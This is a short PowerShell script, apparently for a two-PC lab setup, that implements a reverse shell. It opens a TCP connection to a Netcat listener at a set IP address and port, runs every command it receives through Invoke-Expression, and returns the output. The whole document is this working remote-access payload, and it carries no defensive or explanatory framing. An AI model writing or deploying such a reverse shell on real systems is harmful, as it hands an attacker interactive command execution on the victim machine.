$ip = "192.168.0.102"      # Replace with the IP address of PC1
$port = 1905    # Replace with the port number Netcat is listening on

try {
    # Create a TCP client and connect to PC1
    $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    # Send a connection confirmation
    $writer.WriteLine("Connected to PC1 from PC2")

    # Enter an interactive session
    while ($true) {
        # Read command from PC1
        $command = $reader.ReadLine()
        if ($command -eq "exit") { break }

        # Execute command and capture output
        $output = Invoke-Expression $command 2>&1 | Out-String
        $output += "PS " + (Get-Location).Path + "> "

        # Send output back to PC1
        $writer.WriteLine($output)
    }

    # Close connections
    $writer.Close()
    $reader.Close()
    $client.Close()
} catch {
    # Handle exceptions
    Write-Error "An error occurred: $_"
}
